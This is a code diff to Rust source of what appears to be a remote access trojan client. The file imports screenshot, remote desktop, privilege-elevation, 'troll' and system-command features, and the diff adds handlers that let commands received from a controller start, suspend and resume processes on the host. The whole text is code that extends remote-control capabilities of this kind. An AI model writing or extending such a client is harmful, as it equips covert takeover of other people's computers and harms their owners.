@@ -1,6 +1,6 @@
 use crate::features::other::{take_screenshot, client_info, visit_website, show_messagebox, elevate_client};
 use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
-use crate::features::process::{process_list, kill_process};
+use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::system_commands::system_commands;
 use crate::features::troll::execute_troll_command;
 // use crate::features::webcam::take_webcam;
@@ -101,6 +101,12 @@ pub async fn reading_loop(
             }
 
             Ok(Some(ClientboundPacket::KillProcess(process))) => kill_process(process.pid),
+
+            Ok(Some(ClientboundPacket::StartProcess(name))) => start_process(name),
+            
+            Ok(Some(ClientboundPacket::SuspendProcess(process))) => suspend_process(process.pid),
+
+            Ok(Some(ClientboundPacket::ResumeProcess(process))) => resume_process(process.pid),
 
             Ok(Some(ClientboundPacket::Disconnect)) => std::process::exit(0),
 
